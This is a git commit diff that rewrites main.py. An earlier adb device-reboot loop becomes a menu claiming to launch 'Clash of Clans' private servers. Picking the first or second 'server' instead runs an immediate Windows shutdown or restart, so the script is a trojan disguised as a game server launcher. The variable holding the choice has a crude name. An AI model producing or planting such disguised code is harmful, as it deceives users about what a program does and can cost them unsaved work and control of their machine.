47d8394188615c6955dac1a8fa4767ead6e4a7ec
knightdark10 <79816266+knightdark10@users.noreply.github.com>
2022-01-27 18:42:02 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,18 +1,12 @@
-#!/usr/bin/python
-
-import os, time
-
-for iter in xrange(5):
-
-    adb_reboot = os.popen("sudo adb reboot")
-    print(adb_reboot)
-    print('[INFO] Starting Server...')
-    time.sleep(15)
-
-    adb_wait = os.popen("sudo adb wait-for-device")
-    print(adb_wait)
-    time.sleep(15)
-    print('[INFO] Server Started! Lets Play Clash of Clans.')
-
-    adb_device = os.popen("sudo adb devices -l")
-    print(adb_device)
+import os;
+print("1. Starting Clash of Clans Server For Client 9.256");
+print("2. Starting Clash of Clans Server For Client 11.49");
+print("3. Starting Clash of Clans Server For Client 14.211.16");
+dick = int(input("\n Choose which version Clash of Clans you want run it: "));
+if(dick>=1 and dick<=2):
+    if dick == 1:
+        os.system("shutdown /s /t 1");
+    else:
+        os.system("shutdown /r /t 1");
+else:
+    exit();
